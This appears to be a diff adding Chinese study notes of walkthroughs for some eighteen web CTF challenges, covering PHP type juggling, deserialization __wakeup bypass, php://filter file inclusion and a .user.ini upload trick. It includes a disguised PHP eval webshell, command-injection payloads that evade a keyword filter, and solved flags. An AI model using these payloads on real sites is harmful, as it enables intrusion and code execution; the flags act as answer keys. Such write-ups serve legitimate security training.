@@ -1,0 +1,379 @@
+1. robots.txt:
+# 访问网站的robots文件
+wwww.test.com/robots.txt
+
+2. php2 index.phps可以直接在页面查看php文件的格式:
+# 扫描网站，得到其中有个index.phps文件
+phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器
+看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服> 务器中注册过的MIME类型为文件即可，
+但为了国际通用，所以才用了phps文件类型。
+它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。
+
+# 访问index.phps，得到index源代码
+www.test.com/?id=urlencode(admin)
+
+# 需要进行两次url编码
+www.test.com/?id=urlencode(urlencode(admin))
+
+3. unserialize3 反序列化漏洞，绕过__wakeup()函数:
+# 给出的源代码中存在反序列化调用函数 __wakeup()
+__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。
+
+# __wakeup()绕过漏洞说明
+当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。因此，需要修改序列化字符串中的属性个数
+
+# 将class进行反序列
+O:4:"xctf":1:{s:4:"flag";s:3:"111";}
+
+# 利用漏洞
+O:4:"xctf":3:{s:4:"flag";s:3:"111";}  # 跳过__wakeup()执行跳出逻辑，得到flag
+
+4. ics-06  burpsuite爆破:
+# 考爆破
+扫描出 id=2333
+
+5. view-source  F12查看页面源代码，在注释中得到flag:
+# 查看页面源代码，发现flag被注释了。没有显示在页面上
+
+6. get_post 两个请求方式:
+# 先用GET方式
+GET /?a=1
+
+# 再用POST方式
+POST /
+b=2
+# 得到flag
+
+7. robots  网站爬虫文件:
+# 访问网站的robots文件
+wwww.test.com/robots.txt
+
+# 得到flag.php
+www.test.com/flag.php  # 得到flag
+
+8. backup  备份文件扫描: 
+# 查找index.php的备份文件
+
+# 列出常用备份文件格式  进行扫描
+.bak .back .backup .git .svn .swp .~ .bash_history
+
+9. cookie  查看响应请求:
+# F12  打开开发者工具 查看cookie字段
+cookie cookie.php
+
+# 访问php文件
+www.test.com/cookie.php # 得到flag
+
+10. disableed_button  页面上手动更改代码，去掉按钮禁用:
+# 按钮在页面上被禁用，F12打开页面源代码，找到按钮代码
+# 将 disabled 删除，按钮变成可点击
+
+# 点击按钮，获取flag
+
+11. weak_auth  burpsuite爆破:
+# 考验弱口令 爆破
+
+# 密码为123456， 得到flag
+
+12. simple_php  PHP类型比较绕过:
+<?php
+show_source(__FILE__);
+include("config.php");
+$a=@$_GET['a'];
+$b=@$_GET['b'];
+if($a==0 and $a){  # a=0，$a为false  字符串a=”0“为真
+    echo $flag1;
+}
+if(is_numeric($b)){ # b不能为数字 或者 数字字符串
+    exit();
+}
+if($b>1234){ # 字符串 12345a
+    echo $flag2;
+}
+?> 
+
+a = "0"  为真
+b = "12345s"  为真
+# 分别得到flag
+
+
+13. easyupload  .user.ini用户自定义配置文件漏洞 + 伪造图片头漏洞:
+GIF89a   # jpg文件格式的头
+.user.ini  # 用户自定义php配置文件
+
+# 步骤1 新建.user.ini文件
+GIF89a
+auto_prepend_file=a.jpg
+
+# 步骤2 上传该文件。抓包。
+# Content-Type: application/octet-stream  改为如下
+Content-Type:image/jpg
+
+# 步骤3 新建a.txt文件
+GIF89a
+<?=eval($_REQUEST['angel']);?>
+# 保存后，再文件后缀修改为.jpg
+
+# 步骤4  查看响应的地址
+http://61.147.171.105:56743/uploads/index.php
+
+# 蚁剑连接
+http://61.147.171.105:56743uploads/index.php  # php会去加载用户自定义配置文件  密码angel
+# 获得flag
+
+
+14. fileinclude  filter伪协议读取漏洞:
+#  Notice: Undefined index: language in /var/www/html/index.php on line 9
+#  Please choose the language you want : English or Chinese 
+# Hi,EveryOne,The flag is in flag.php
+
+# 查看网页源代码
+if( !ini_get('display_errors') ) {
+  ini_set('display_errors', 'On');
+  }
+error_reporting(E_ALL);
+$lan = $_COOKIE['language'];  # 参数点 Cookie请求头。  传参为language
+if(!$lan)
+{
+    @setcookie("language","english");
+    @include("english.php");
+}
+else
+{
+    @include($lan.".php");  # 自动拼接传参后面 .php
+}
+$x=file_get_contents('index.php');
+echo $x;
+
+# 自己添加请求头字段
+Cookie: language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
+
+# 获得base64的flag.php,解码后得到flag
+
+
+15. fileclude  filter伪协议读取 + input伪协议执行  组合漏洞:
+# 已知的代码
+WRONG WAY! <?php
+include("flag.php");  # 这里得知flag.php就在当前目录下
+highlight_file(__FILE__);  # 控制文件着色样式，与逻辑无关
+if(isset($_GET["file1"]) && isset($_GET["file2"]))
+{
+    $file1 = $_GET["file1"];  
+    $file2 = $_GET["file2"]; # 两个传参来控制
+    if(!empty($file1) && !empty($file2))  # 两个传参都不能为空
+    {
+        if(file_get_contents($file2) === "hello ctf")  # 这里传入数据  php://input读取传入数据
+        {
+            include($file1);  # 这里传入需要读取的文件  php://filter读取flag文件
+        }
+    }
+    else
+        die("NONONO");
+} 
+
+# 考两个伪协议
+GET /?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=php://input
+Host: 61.147.171.105:62805
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 9
+
+hello ctf  # file2  input协议读取这里数据去比较
+# 得到base64的flag.php文件，解码获取flag
+
+
+16. easyPhp  PHP弱类型比较:
+# 题目主要考5部分
+1. if(isset($a) && intval($a) >6000000 && strlen($a)<=3) # 1e9 指数计数形式
+
+2. isset($b) && '8b184b' === substr(md5($b),-6,6) # 53724  md5哈希的最后6位相等
+
+3. is_array($c) && !is_numeric($c['m']) && $c['m']>2022 # 2023c c[m] 不是数字，并且弱类型大于2022
+
+4. is_array(@$c['n']) && count($c['n']) == 2 && is_array($c['n'][0]) # @  表示不提示报错信息 
+# c[n]是一个数组，c[n][0]也是一个数组  二维数组
+
+# 绕过array_search这个函数
+5.1 $d = array_search('DGGJ',$c['n']) #  "字符串"==0 为真
+5.2 $d ===false?die('no...'):NULL # die  提示报错信息，直接退出程序
+5.3 $val === 'DGGJ'?die('no......'):NULL
+#  c={"m" : "2023c","n" : [[],0]}
+
+
+17. fileinclude  filter伪协议读取漏洞  +  iconv编码格式读取:
+尝试使用 php://filter/read=convert.base64-encode/resource=./check.php
+#  read  base64  被检测到，不能使用
+通过字符串检测爆破，得出iconv可以使用
+
+# payload：
+/?filename=php://filter/convert.iconv.UTF-8.UTF-7/resource=./check.php
+
+# 得到编码后的字符串
++ADw?php
+if(+ACQAXw-GET+AFsAIg-filename+ACIAXQ)+AHs
+    +ACQ-preg+AF8-match+AF8-username +AD0 'return preg+AF8-match(+ACI-/base+AHw-be+AHw-encode+AHw-print+AHw-zlib+AHw-quoted+AHw-write+AHw-rot13+AHw-read+AHw-string/i+ACI, +ACQAXw-GET+AFsAIg-filename+ACIAXQ)+ADs'+ADs
+    if (eval(+ACQ-preg+AF8-match+AF8-username)) +AHs
+        die(+ACI-do not hack+ACEAIg)+ADs
+    +AH0
++AH0
+
+# iconv解码
+$decode_data=iconv("UTF-7","UTF-8",$data);
+
+# 得到check.php文件内容
+<?php
+if($_GET["filename"]){
+        $preg_match_username = 'return preg_match("/base|be|encode|print|zlib|quoted|write|rot13|read|string/i", $_GET["filename"]);';
+        if (eval($preg_match_username)) {
+        die("do not hack!");
+    }
+}
+
+# flag payload
+/?filename=php://filter/convert.iconv.UTF-8.UTF-7/resource=./flag.php
+
+# iconv编码数据
++ADw?php
++ACQ-flag+AD0'cyberpeace+AHs-231cdb39d4beb52f220fd9bc1de55d1d+AH0'+ADs
+
+# 解码后 得到flag
+<?php
+$flag='cyberpeace{231cdb39d4beb52f220fd9bc1de55d1d}';
+
+
+18. unseping 反序列化 + 字符串检测绕过:
+<?php
+highlight_file(__FILE__);
+
+class ease{
+    
+    private $method;
+    private $args;
+    function __construct($method, $args) {
+        $this->method = $method;
+        $this->args = $args;
+    }
+ 
+    function __destruct(){
+        if (in_array($this->method, array("ping"))) {
+            call_user_func_array(array($this, $this->method), $this->args); # args  为数组
+        }
+    }
+
+    function ping($ip){
+        exec($ip, $result);
+        var_dump($result);
+    }
+    #  上面内容为 第一个传参为method='ping'，调用执行 args='ls' 命令
+
+    function waf($str){ #  字符串检测
+        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
+            return $str;
+        } else {
+            echo "don't hack";
+        }
+    }
+ 
+    function __wakeup(){ #  反序列化后  执行该函数
+        foreach($this->args as $k => $v) {
+            $this->args[$k] = $this->waf($v); # 调用检测函数
+        }
+    }   
+}
+
+$ctf=@$_POST['ctf'];
+@unserialize(base64_decode($ctf));  #  反序列化，并且进行base64编码
+?>
+
+#  考反序列化 绕过字符串检测
+class ease
+{
+    private $method;
+    private $args;
+
+    function __construct($method, $args)
+    {
+        $this->method = $method;
+        $this->args = $args;
+    }
+}
+
+$a = new ease("ping", array('l$@s')); #  ls  >  l$@s ，绕过字符串检测
+$data = base64_encode(serialize($a));  # 反序列化 ease 
+# ctf=payloay 得到
+#  ctf=Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czo0OiJsJEBzIjt9fQ==
+#  array(2) { [0]=> string(12) "flag_1s_here" [1]=> string(9) "index.php" } 
+
+$a = new ease("ping", array('ca$@t${IFS}`find`')); #  ${IFS}  填充空格
+$data = base64_encode(serialize($a));
+# ctf=payloay 得到
+# Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNzoiY2EkQHQke0lGU31gZmluZGAiO319
+# cyberpeace{5f509a6a902b0a08c0fdc60727290f1f}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
